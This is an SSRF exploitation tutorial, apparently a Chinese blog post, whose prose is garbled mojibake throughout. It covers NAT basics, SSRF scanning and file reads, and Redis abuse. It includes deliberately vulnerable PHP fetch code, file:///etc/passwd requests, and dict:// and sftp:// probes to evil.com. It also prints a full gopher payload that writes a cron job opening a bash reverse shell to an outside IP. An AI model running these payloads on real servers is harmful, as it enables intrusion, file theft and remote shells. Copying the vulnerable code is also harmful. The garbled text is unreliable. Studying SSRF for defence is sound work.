ä»€ä¹ˆæ˜¯å†…ç½‘è®¿é—® csdnä¸Šçœ‹äº†ä¸€ç¯‡å¤§ä½¬çš„æ–‡ç« ï¼Œæ„Ÿè§‰æŒºé€šä¿—æ˜“æ‡‚ã€‚æˆ‘å°±ç®€å•å¤è¿°ä¸€ä¸‹ï¼ŒåŠ æ·±ä¸€ä¸‹å°è±¡ã€‚ é¦–å…ˆéœ€è¦äº†è§£ä¸€ä¸‹å…¬æœ‰ipå’Œç§æœ‰ip å…¬æœ‰ip:å…¬æœ‰ipæ˜¯å…¨çƒå”¯ä¸€çš„ï¼Œéœ€è¦æ³¨å†Œæ‰èƒ½ä½¿ç”¨ã€‚è€Œä¸”æ˜¯å¯ä»¥ç›´æ¥ä¸Šç½‘çš„ã€‚ ç§æœ‰ipï¼šç§æœ‰ipä¸éœ€è¦æ³¨å†Œï¼Œå› æ­¤ï¼Œä»–ä¸èƒ½ç›´æ¥ä¸Šç½‘ã€‚æˆ‘ä»¬å¹³æ—¶ä¸Šç½‘ä¸€èˆ¬éƒ½æ˜¯é€šè¿‡ç½‘ç»œè¿è¥å•†ï¼ˆç§»åŠ¨ï¼Œè”é€šï¼Œç”µä¿¡ï¼‰ã€‚åŸç†å°±æ˜¯è¿™äº›ä¸ªè¿è¥å•†å‘€ï¼Œä»–ä»¬æ˜¯è´­ä¹°äº†å…¬æœ‰ipçš„ã€‚ç„¶åä»–ä»¬åˆ†é…ç»™æˆ‘ä»¬è¿™äº›ç”¨æˆ·ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„å°±æ˜¯ç§æœ‰ipï¼Œæˆ–è€…å«å±€åŸŸç½‘ã€‚è¿™æ ·çš„è¯ï¼Œå°±ä¼šå¯¼è‡´ä½ å’Œä½ å‘¨å›´çš„é‚»å±…ä»¬åˆ†å‡ºæ¥çš„ç§æœ‰ipå¯èƒ½æ˜¯ä¸€æ ·çš„ã€‚ è¿™æ ·çš„å¥½å¤„æ˜¯æˆ‘ä»¬å¤§å®¶éƒ½å¯ä»¥æ–¹ä¾¿çš„ä¸Šç½‘ï¼Œå½“ç„¶ä¹Ÿæœ‰ä¸åˆ©ä¹‹å¤„ï¼Œé‚£å°±æ˜¯ä¸¤å®¶ç›¸åŒç§æœ‰ipåŒæ—¶è®¿é—®ç™¾åº¦é¡µé¢ï¼Œè¿™ä¸ªç™¾åº¦çš„æœåŠ¡å™¨æ€ä¹ˆåˆ†è¾¨è¿™ä¸¤å®¶åˆ†åˆ«æ˜¯è°å‘¢ã€‚è¿™ä¸ªå°±è¦ç”¨åˆ°å¦å¤–ä¸€ä¸ªä¸œè¥¿ï¼šç«¯å£æ˜ å°„ã€‚ ä»€ä¹ˆæ˜¯ç«¯å£æ˜ å°„ ç«¯å£æ˜ å°„æ˜¯NATçš„ä¸€ç§ï¼Œä»–å°†å¤–ç½‘IPåœ°å€çš„ä¸€ä¸ªç«¯å£æ˜ å°„åˆ°å†…ç½‘ä¸­ä¸€å°æœºå™¨ï¼Œæä¾›ç›¸åº”çš„æœåŠ¡ã€‚å½“ç”¨æˆ·è®¿é—®è¯¥IPçš„è¿™ä¸ªç«¯å£æ—¶ï¼ŒæœåŠ¡å™¨è‡ªåŠ¨å°†è¯·æ±‚æ˜ å°„åˆ°å¯¹åº”å±€åŸŸç½‘çš„å†…éƒ¨æœºå™¨ä¸Šï¼Œç°åœ¨å¸‚åœºæ˜¯çš„å®¶åº­è·¯ç”±å™¨éƒ½å…·å¤‡NATåŠŸèƒ½ï¼Œä¹Ÿå¯ä»¥å®ç°ç«¯å£æ˜ å°„ã€‚ä¸‹å›¾æ˜¯å°ç±³è·¯ç”±å™¨çš„ç«¯å£æ˜ å°„è®¾ç½®å›¾ï¼š å¯¹äºè¿™ä¸ªæ¦‚å¿µï¼Œæˆ‘ä¸ªäººçš„ç†è§£å°±æ˜¯å¤–ç½‘çš„ipåœ°å€çš„ä¸€ä¸ªç«¯å£ä¸å†…ç½‘çš„ä¸€ä¸ªç«¯å£(æˆ–è®¸æ˜¯ç›´æ¥å¯¹åº”åˆ°å†…ç½‘çš„æŸä¸ªæœåŠ¡å™¨?ä¸‹é¢çš„å›¾æ›´å¥½ç†è§£)å®ç°å¯¹åº”ã€‚ æˆ‘ä»¬å¹³æ—¶ç»è¿‡è·¯ç”±å™¨ï¼Œé€šè¿‡å®½å¸¦ï¼Œæœ€ç»ˆå»åˆ°è¿è¥å•†é‚£è¾¹ï¼Œæ•°æ®æ˜¯ä»è¿è¥å•†å‡ºå»ï¼Œæœ€ç»ˆæ•°æ®æ˜¯å›åˆ°è¿è¥å•†é‚£è¾¹ï¼Œè¿è¥å•†å†æŠŠæ•°æ®å‘é€åˆ°ç”¨æˆ·çš„ç”µè„‘ã€‚ è·¯ç”±å™¨ï¼Œè‡³å°‘æœ‰ä¸¤ä¸ªç«¯å£ï¼šWAN å£å’Œ LAN å£ã€‚ WANï¼šæ¥å¤–éƒ¨ IP åœ°å€ç”¨ï¼Œé€šå¸¸æŒ‡çš„æ˜¯å‡ºå£ï¼Œè½¬å‘æ¥è‡ªå†…éƒ¨ LAN æ¥å£çš„ IP æ•°æ®åŒ…ï¼Œè¿™ä¸ªå£çš„ IP æ˜¯å”¯ä¸€çš„ã€‚ LANï¼šæ¥å†…éƒ¨ IP åœ°å€ç”¨ï¼ŒLAN å†…éƒ¨æ˜¯äº¤æ¢æœºã€‚ A ç”µè„‘çš„ IP æ˜¯å±€åŸŸç½‘ IPï¼ˆ192.168.31.11ï¼‰ï¼Œè¿™ä¸ª IPï¼ˆ192.168.31.11ï¼‰æ˜¯ä»è·¯ç”±å™¨çš„ lanå£åˆ†é…çš„ã€‚ å½“æˆ‘ä»¬ä¸Šç™¾åº¦çš„æ—¶å€™ï¼Œç»è¿‡è·¯ç”±å™¨çš„ wanå£ï¼Œè¿›è¡Œç›¸åº”çš„IPã€ç«¯å£è½¬åŒ–ï¼š192.168.31.11:80 -&gt; 10.221.0.24:8080,æ‰€ä»¥ï¼Œä» wanå£å‡ºå»çš„åœ°å€ä¸ºï¼š10.221.0.24:8080ã€‚ æœ€åï¼Œç»è¿‡è¿è¥å•†ï¼Œè¿è¥å•†é‚£è¾¹ä¼šåšç›¸åº”çš„ç«¯å£æ˜ å°„ï¼ˆè€Œä¸”æ˜¯åŠ¨æ€ç«¯å£æ˜ å°„ï¼‰ï¼Œå­ç½‘ IPï¼ˆ10.221.0.24:8080ï¼‰è½¬åŒ–ä¸ºå…¬ç½‘IPï¼ˆ128.0.0.1:8888ï¼‰ï¼Œé€šè¿‡è¿™ä¸ªå…¬ç½‘ IP å»è®¿é—®ç™¾åº¦æœåŠ¡å™¨ è¿™ä½åšä¸»è´´çš„å›¾ä¹Ÿæ˜¯éå¸¸çš„å½¢è±¡ï¼Œä¸Šé¢ä¹Ÿæœ‰è¯¦ç»†çš„ä»‹ç»ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å·¦ä¸‹è§’å’Œå³ä¸‹è§’ä¸¤ä¸ªipåœ°å€å¯¹åº”çš„éƒ½æ˜¯ç”¨æˆ·çš„ç§æœ‰ipï¼Œç„¶åé€šè¿‡LANå°†å­ç½‘è¿›è¡Œè½¬æ¢ã€‚ç„¶åå†é€šè¿‡WANå£å°†å­ç½‘è½¬ä¸ºå…¬ç½‘ã€‚ ä¸‰ã€æ¼æ´æŒ–æ˜ å±å®³ä¸åˆ©ç”¨ï¼š 1ã€ç«¯å£æ‰«æ å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æ egï¼šhttp://example.com/ssrf.php?url=http://192.168.139.1:80/ é€šè¿‡åº”ç”¨å“åº”æ—¶é—´ã€è¿”å›çš„é”™è¯¯ä¿¡æ¯ï¼Œæœªå¼€æ”¾ç«¯å£ä¼šæ˜¾ç¤ºç©ºç™½æˆ–è€…æŠ¥é”™ï¼Œå¼€æ”¾ç«¯å£ä¼šæ˜¾ç¤ºæœåŠ¡çš„bannerä¿¡æ¯ â€‹ â€‹ 2ã€æ”»å‡»å†…ç½‘ã€æœ¬åœ°æ¼æ´æœåŠ¡ â€‹ â€‹ æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åºï¼ˆæº¢å‡ºã€å¼±å£ä»¤ç­‰ï¼‰ â€‹ â€‹ åˆ©ç”¨Gopheråè®®æ‹“å±•æ”»å‡»é¢ â€‹ â€‹ 3ã€å†…ç½‘Webåº”ç”¨æŒ‡çº¹è¯†åˆ«ã€æ”»å‡»æ¼æ´åº”ç”¨ â€‹ â€‹ è®¿é—®é»˜è®¤æ–‡ä»¶ï¼Œå¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼ˆæ¡†æ¶ï¼Œå¹³å°ï¼Œæ¨¡å—ä»¥åŠCMSç­‰ ï¼‰ â€‹ â€‹ æ”»å‡»å†…å¤–ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨getå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼ˆå¦‚struts2ï¼Œsqliç­‰ï¼‰; â€‹ â€‹ ç¬¬ä¸€æ­¥ï¼Œåº”ç”¨æŒ‡çº¹è¯†åˆ«----&gt;ç¬¬äºŒæ­¥ï¼Œå¯»æ‰¾æ¼æ´-----&gt;ç¬¬ä¸‰æ­¥ï¼Œæ¼æ´åˆ©ç”¨ â€‹ â€‹ 4ã€æ–‡ä»¶è¯»å– â€‹ â€‹ è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œåˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œæäº¤å‚æ•°ç­‰ â€‹ â€‹ http://example.com/ssrf.php?url=file:///etc/passwd 1ã€å¯ä»¥å¯¹æœåŠ¡å™¨æ‰€åœ¨çš„å†…ç½‘ç¯å¢ƒè¿›è¡Œç«¯å£æ‰«æã€èµ„æºè®¿é—® 2ã€åˆ©ç”¨æ¼æ´å’ŒPayloadè¿›ä¸€æ­¥æ”»å‡»è¿è¡Œå…¶ä»–çš„åº”ç”¨ç¨‹åº; 3ã€å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œé€šè¿‡è®¿é—®åº”ç”¨å­˜åœ¨çš„é»˜è®¤æ–‡ä»¶å®ç° 4ã€GETå‹æ¼æ´åˆ©ç”¨ï¼ŒGETå‚æ•°å°±å¯ä»¥å®ç°çš„æ”»å‡»ï¼Œæ¯”å¦‚struts2æ¼æ´åˆ©ç”¨ç­‰ 5ã€POSTå‹æ¼æ´åˆ©ç”¨ï¼Œå¯åˆ©ç”¨gopheråè®®è¿›è¡Œå‚æ•°æ„é€ ; 6ã€åˆ©ç”¨Redisæœªæˆæƒè®¿é—®getshellã€Weblogicé»˜è®¤SSRFæ¼æ´é¡µé¢ 7ã€å¦‚æœssrfæ¼æ´å­˜åœ¨äºäº‘æœåŠ¡å™¨ æ”»å‡»å…ƒæ•°æ®æœåŠ¡ æ”»å‡»å­˜å‚¨æ¡¶ æ”»å‡»Kubelet API è¶Šæƒæ”»å‡»äº‘å¹³å°å†…å…¶ä»–ç»„ä»¶æˆ–æœåŠ¡ æ¼æ´åœºæ™¯ï¼š 1ã€é€šè¿‡URLåœ°å€è¿›è¡Œç½‘é¡µåˆ†äº«; http://share.xxx.com/index.php?url=http://www.xxx.com 2ã€è½¬ç æœåŠ¡ï¼Œé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µè½¬æ¢æ ¼å¼ 3ã€å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼Œä¸€èˆ¬æ˜¯é€šè¿‡urlå‚æ•°è¿›è¡Œå›¾ç‰‡è·å– http://image.xxx.com/image.php?image=http://www.xxx.com 4ã€æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨urlçš„åŠŸèƒ½; 5ã€è®¾å¤‡åå°ç®¡ç†è¿›è¡Œå­˜æ´»æµ‹è¯•; 6ã€è¿œç¨‹èµ„æºè°ƒç”¨åŠŸèƒ½; 7ã€æ•°æ®åº“å†…ç½®åŠŸèƒ½; 8ã€ç¼–è¾‘å™¨è¿›è¡Œè¿œç¨‹å›¾ç‰‡æŠ“å–ï¼Œå¦‚: ueditor; 9ã€æ‰“åŒ…é™„ä»¶æˆ–è€…å†…å®¹ç¼–è¾‘å¹¶å¯¼å‡ºæ—¶ 10ã€PDFç”Ÿæˆæˆ–å¯¼å‡º 11ã€ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´ share wap url link src source target u display sourceURl imageURL domain ç®€å•æ¥è¯´ï¼šæ‰€æœ‰ç›®æ ‡æœåŠ¡å™¨ä¼šä»è‡ªèº«å‘èµ·è¯·æ±‚çš„åŠŸèƒ½ç‚¹ï¼Œä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶åœ°å€çš„å‚æ•°ï¼Œéƒ½å¯èƒ½é€ æˆSSRFæ¼æ´ ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆUpload from URLï¼ŒImport &amp; Export RSS Feedï¼‰ æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼ˆOracleã€MongoDBã€MSSQLã€Postgresã€CouchDBï¼‰ Webmail æ”¶å–å…¶ä»–é‚®ç®±é‚®ä»¶ï¼ˆPOP3ã€IMAPã€SMTPï¼‰ æ–‡ä»¶å¤„ç†ã€ç¼–ç å¤„ç†ã€å±æ€§ä¿¡æ¯å¤„ç†ï¼ˆffmpegã€ImageMagicã€DOCXã€PDFã€XMLï¼‰ åˆ©ç”¨æŠ€å·§ åˆ©ç”¨æ¡ä»¶ï¼šè¢«æ”»å‡»çš„æœåŠ¡ç­‰æ²¡æœ‰å¼€å¯åŠ å¯†ä¼ è¾“ä¸é‰´æƒã€‚ ç«¯å£æ‰«æï¼ˆæ‰«æå†…ç½‘ï¼‰ æ”»å‡»å†…ç½‘å­˜åœ¨æ¼æ´çš„æœåŠ¡ æ”»å‡»Webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«åŠå…¶ä¸­çš„æ¼æ´ å¦‚æœPHPå®‰è£…äº†expectæ‰©å±•ï¼Œå¯ä»¥é€šè¿‡expectåè®®æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ dosæ”»å‡» file åè®®æš´åŠ›æšä¸¾æ•æ„Ÿæ–‡ä»¶ Redisæœªæˆæƒæ¼æ´çš„6ç§åˆ©ç”¨æ–¹æ³• ä¿å­˜æ–‡ä»¶åˆ°wwwç›®å½•ï¼Œå½¢æˆwebshell åˆ›å»ºauthorized_keysæ–‡ä»¶ï¼Œåˆ©ç”¨ssh ç§é’¥ç™»å½•æœåŠ¡å™¨ å†™è®¡åˆ’ä»»åŠ¡(/var/spool/cron/ &amp; /etc/cron.d/) slave of 8.8.8.8 ä¸»ä»æ¨¡å¼åˆ©ç”¨ å†™å…¥åˆ°/etc/profile.d/ ç”¨æˆ·ç¯å¢ƒå˜é‡ä¿®æ”¹ å¼€å¯AOFæŒä¹…åŒ–çº¯æ–‡æœ¬è®°å½• appendfilename å­˜åœ¨SSRFæ¼æ´çš„ç«™ç‚¹ä¸»è¦åˆ©ç”¨å››ä¸ªåè®®ï¼Œåˆ†åˆ«æ˜¯httpã€fileã€gopherã€dictåè®® fileåè®®è¿›è¡Œæœ¬åœ°æ–‡ä»¶çš„è¯»å– httpåè®®è¿›è¡Œå†…ç½‘çš„ipæ‰«æã€ç«¯å£æ¢æµ‹ æ¢æµ‹åˆ°6379ç«¯å£å¼€æ”¾ï¼Œå¯ä»¥åˆ©ç”¨httpã€gopherã€dictè¿™å‡ ä¸ªåè®®æ¥æ‰“å¼€æ”¾6379ç«¯å£çš„redisæœåŠ¡ã€‚ æœ€å¸¸è§çš„æ˜¯é€šè¿‡fileã€dictã€gopherè¿™ä¸‰ä¸ªåè®®æ¥è¿›è¡Œæ¸—é€ã€‚ curl -vvv 'dict://127.0.0.1:6379/info' curl -vvv 'file:///etc/passwd' # * æ³¨æ„: é“¾æ¥ä½¿ç”¨å•å¼•å·ï¼Œé¿å…$å˜é‡é—®é¢˜ curl -vvv 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a' å››ã€äº§ç”ŸSSRFæ¼æ´çš„å‡½æ•° SSRFæ”»å‡»å¯èƒ½å­˜åœ¨ä»»ä½•è¯­è¨€ç¼–å†™çš„åº”ç”¨ï¼Œæ¥ä¸‹æ¥å°†ä¸¾ä¾‹phpä¸­å¯èƒ½å­˜åœ¨SSRFæ¼æ´çš„å‡½æ•°ã€‚ 1ã€file_get_contents:ï¼ˆåªèƒ½ä½¿ç”¨GETæ–¹å¼è·å–æ•°æ®ï¼‰ ä¸‹é¢çš„ä»£ç ä½¿ç”¨file_get_contentså‡½æ•°ä»ç”¨æˆ·æŒ‡å®šçš„urlè·å–å›¾ç‰‡ã€‚ç„¶åæŠŠå®ƒç”¨ä¸€ä¸ªéšæœºæ–‡ä»¶åä¿å­˜åœ¨ç¡¬ç›˜ä¸Šï¼Œå¹¶å±•ç¤ºç»™ç”¨æˆ·ã€‚ å®šä¹‰ï¼šæŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ è¯­æ³•ï¼šfile_get_contents(path,include_path,context,start,max_length) å‚æ•°\tæè¿° path\tå¿…éœ€ã€‚è¦è¯»å–çš„æ–‡ä»¶ include_path\tå¯é€‰ã€‚è¦åœ¨ include_path ä¸­æœå¯»æ–‡ä»¶ï¼Œå°†è¯¥å‚æ•°è®¾ä¸º \"1\" context\tå¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒï¼Œcontext æ˜¯ä¸€å¥—å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„é€‰é¡¹ã€‚è‹¥ä½¿ç”¨ nullï¼Œåˆ™å¿½ç•¥ã€‚ start\tå¯é€‰ã€‚æ–‡ä»¶ä¸­å¼€å§‹è¯»å–çš„ä½ç½® (é€‚ç”¨äºPHP 5.1ä»¥å) max_length\tå¯é€‰ã€‚è¯»å–çš„å­—èŠ‚æ•° (é€‚ç”¨äºPHP 5.1ä»¥å) &lt;?php if (isset($_POST['url'])) { $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg'; file_put_contents($filename, $content); echo $_POST['url']; $img = \"&lt;img src=\\\"\".$filename.\"\\\"/&gt;\"; } echo $img; ?&gt; 2ã€fsockopen(): ä»¥ä¸‹ä»£ç ä½¿ç”¨fsockopenå‡½æ•°å®ç°è·å–ç”¨æˆ·æŒ‡å®šurlçš„æ•°æ®ï¼ˆæ–‡ä»¶æˆ–è€…htmlï¼‰ã€‚è¿™ä¸ªå‡½æ•°ä¼šä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚ å®šä¹‰ï¼šæ‰“å¼€ä¸€ä¸ªç½‘ç»œè¿æ¥æˆ–è€…ä¸€ä¸ªUnixå¥—æ¥å­—è¿æ¥ å‚æ•°\tæè¿° hostname\tå®‰è£…äº†OpenSSLï¼Œæ·»åŠ è®¿é—®åè®®ssl://æˆ–è€…æ˜¯tls://ï¼Œä»è€Œå¯ä»¥ä½¿ç”¨åŸºäºTCP/IPåè®®çš„SSLæˆ–è€…TLSçš„å®¢æˆ·ç«¯è¿æ¥åˆ°è¿œç¨‹ä¸»æœº port\tç«¯å£å·ã€‚å¦‚æœå¯¹è¯¥å‚æ•°ä¼ ä¸€ä¸ª-1ï¼Œåˆ™è¡¨ç¤ºä¸ä½¿ç”¨ç«¯å£ï¼Œä¾‹å¦‚unix:// errno\tå¦‚æœerrnoçš„è¿”å›å€¼ä¸º0ï¼Œè€Œä¸”è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼ä¸ºfalseï¼Œé‚£ä¹ˆè¿™è¡¨æ˜è¯¥é”™è¯¯å‘ç”Ÿåœ¨å¥—æ¥å­—è¿æ¥ï¼ˆconnect()ï¼‰è°ƒç”¨ä¹‹å‰ï¼Œå¯¼è‡´è¿æ¥å¤±è´¥çš„åŸå› æœ€å¤§çš„å¯èƒ½æ˜¯åˆå§‹åŒ–å¥—æ¥å­—çš„æ—¶å€™å‘ç”Ÿäº†é”™è¯¯ errstr\té”™è¯¯ä¿¡æ¯å°†ä»¥å­—ç¬¦ä¸²çš„ä¿¡æ¯è¿”å›ã€‚ timeout\tè®¾ç½®è¿æ¥çš„æ—¶é™ï¼Œå•ä½ä¸ºç§’ã€‚ &lt;?php function GetFile($host,$port,$link) { $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) { echo \"$errstr (error number $errno) \"; }else { $out = \"GET $link HTTP/1.1\\r \"; $out .= \"Host: $host\\r \"; $out .= \"Connection: Close\\r \\r \"; $out .= \"\\r \"; fwrite($fp, $out); $contents=''; while (!feof($fp)) { $contents.= fgets($fp, 1024); } fclose($fp); return $contents; } } ?&gt; 3ã€curl_exec():æ”¯æŒå¤šç§åè®® cURLè¿™æ˜¯å¦ä¸€ä¸ªéå¸¸å¸¸è§çš„å®ç°ï¼Œå®ƒé€šè¿‡ PHPè·å–æ•°æ®ã€‚æ–‡ä»¶/æ•°æ®è¢«ä¸‹è½½å¹¶å­˜å‚¨åœ¨â€œcurledâ€æ–‡ä»¶å¤¹ä¸‹çš„ç£ç›˜ä¸­ï¼Œå¹¶é™„åŠ äº†ä¸€ä¸ªéšæœºæ•°å’Œâ€œ.txtâ€æ–‡ä»¶æ‰©å±•åã€‚ å®šä¹‰ï¼šæ‰§è¡Œä¸€ä¸ªcURLä¼šè¯ å‚æ•°ï¼šch ç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚ ç”¨æ³•ï¼šæŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨ curl_exec($ch) &lt;?php if (isset($_POST['url'])) { $link = $_POST['url']; $curlobj = curl_init(); curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($curlobj); curl_close($curlobj); $filename = './curled/'.rand().'.txt'; file_put_contents($filename, $result); echo $result; } ?&gt; æ³¨æ„äº‹é¡¹ ä¸€èˆ¬æƒ…å†µä¸‹PHPä¸ä¼šå¼€å¯fopençš„gopher wrapper file_get_contentsçš„gopheråè®®ä¸èƒ½URLç¼–ç  file_get_contentså…³äºGopherçš„302è·³è½¬ä¼šå‡ºç°bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥ curl/libcurl 7.43 ä¸Šgopheråè®®å­˜åœ¨bug(%00æˆªæ–­) ç»æµ‹è¯•7.49 å¯ç”¨ curl_exec() é»˜è®¤ä¸è·Ÿè¸ªè·³è½¬ï¼Œ file_get_contents()æ”¯æŒphp://inputåè®® äº”ã€SSRFä¸­URLçš„ä¼ªåè®® redisæœåŠ¡æ˜¯åœ¨6379ç«¯å£å¼€å¯çš„ æµ…æµ…äº†è§£ä¸€ä¸‹redisæœåŠ¡ æµ…æµ…äº†è§£ä¸€ä¸‹curlå‘½ä»¤ curl æ˜¯å¸¸ç”¨çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨æ¥è¯·æ±‚ Web æœåŠ¡å™¨ã€‚å®ƒçš„åå­—å°±æ˜¯å®¢æˆ·ç«¯ï¼ˆclientï¼‰çš„ URL å·¥å…·çš„æ„æ€ ä¸å¸¦æœ‰ä»»ä½•å‚æ•°æ—¶ï¼Œcurl å°±æ˜¯å‘å‡º GET è¯·æ±‚ $ curl https://www.example.com ä¸Šé¢å‘½ä»¤å‘www.example.comå‘å‡º GET è¯·æ±‚ï¼ŒæœåŠ¡å™¨è¿”å›çš„å†…å®¹ä¼šåœ¨å‘½ä»¤è¡Œè¾“å‡º -vå‚æ•°è¾“å‡ºé€šä¿¡çš„æ•´ä¸ªè¿‡ç¨‹ï¼Œç”¨äºè°ƒè¯•ã€‚æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨-vå‚æ•°è¿›è¡Œè¯»å–æ–‡ä»¶ ä½¿ç”¨fileåè®®curl -v file:///etc/passwd ä½¿ç”¨ftpåè®® curl -v \"ftp://127.0.0.1:ç«¯å£/info\" ä½¿ç”¨dictåè®® curl -v \"dict://127.0.0.1:ç«¯å£/info\" ä½¿ç”¨gopheråè®® curl -v \"gopher://127.0.0.1:ç«¯å£/_info\" å…¶ä»–å‚æ•°å¯ä»¥å‚è€ƒcurl å¸¸è§å†…ç½‘IPæ®µ å±€åŸŸç½‘åœ°å€èŒƒå›´åˆ†ä¸‰ç±»ï¼Œä»¥ä¸‹IPæ®µä¸ºå†…ç½‘IPæ®µï¼š Cç±»ï¼š192.168.0.0 - 192.168.255.255 Bç±»ï¼š172.16.0.0 - 172.31.255.255 Aç±»ï¼š10.0.0.0 - 10.255.255.255 å½“æˆ‘ä»¬å‘ç°SSRFæ¼æ´åï¼Œé¦–å…ˆè¦åšçš„äº‹æƒ…å°±æ˜¯æµ‹è¯•æ‰€æœ‰å¯ç”¨çš„URLä¼ªåè®® file:/// ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚ï¼Œfile:///etc/passwd dict:// å­—å…¸æœåŠ¡å™¨åè®®ï¼Œè®¿é—®å­—å…¸èµ„æºï¼Œå¦‚ï¼Œdict:///ip:6739/infoï¼š sftp:// SSHæ–‡ä»¶ä¼ è¾“åè®®æˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®® ldap:// è½»é‡çº§ç›®å½•è®¿é—®åè®® tftp:// ç®€å•æ–‡ä»¶ä¼ è¾“åè®® gopher:// åˆ†å¸ƒå¼æ–‡æ¡£ä¼ é€’æœåŠ¡ï¼Œå¯ä½¿ç”¨gopherusç”Ÿæˆpayload 5.1 file è¿™ç§URL Schemaå¯ä»¥å°è¯•ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶ï¼š http://example.com/ssrf.php?url=file:///etc/passwd http://example.com/ssrf.php?url=file:///C:/Windows/win.ini å¦‚æœè¯¥æœåŠ¡å™¨é˜»æ­¢å¯¹å¤–éƒ¨ç«™ç‚¹å‘é€HTTPè¯·æ±‚ï¼Œæˆ–å¯ç”¨äº†ç™½åå•é˜²æŠ¤æœºåˆ¶ï¼Œåªéœ€ä½¿ç”¨å¦‚ä¸‹æ‰€ç¤ºçš„URL Schemaå°±å¯ä»¥ç»•è¿‡è¿™äº›é™åˆ¶ï¼š 5.2 dict è¿™ç§URL Schemeèƒ½å¤Ÿå¼•ç”¨å…è®¸é€šè¿‡DICTåè®®ä½¿ç”¨çš„å®šä¹‰æˆ–å•è¯åˆ—è¡¨ã€‚ DICTåè®®,ä¸€ä¸ªå­—å…¸æœåŠ¡å™¨åè®®,A Dictionary Server Protocolï¼Œå…è®¸å®¢æˆ·ç«¯åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è®¿é—®æ›´å¤šå­—å…¸å¹¶ä¸”è¯¥åè®®çº¦å®šæœåŠ¡å™¨ç«¯ä¾¦å¬ç«¯å£å·:2628ã€‚ http://example.com/ssrf.php?dict://evil.com:1337/ evil.com:$ nc -lvp 1337 Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 31126)CLIENT libcurl 7.40.0 5.3 sftp åœ¨è¿™é‡Œï¼ŒSftpä»£è¡¨SSHæ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSSH File Transfer Protocolï¼‰ï¼Œæˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®ï¼ˆSecure File Transfer Protocolï¼‰ï¼Œè¿™æ˜¯ä¸€ç§ä¸SSHæ‰“åŒ…åœ¨ä¸€èµ·çš„å•ç‹¬åè®®ï¼Œå®ƒè¿è¡Œåœ¨å®‰å…¨è¿æ¥ä¸Šï¼Œå¹¶ä»¥ç±»ä¼¼çš„æ–¹å¼è¿›è¡Œå·¥ä½œã€‚ http://example.com/ssrf.php?url=sftp://evil.com:1337/ evil.com:$ nc -lvp 1337 Connection from [192.168.0.12] port 1337[tcp/*] accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2 5.4 ldap://æˆ–ldaps:// æˆ–ldapi:// 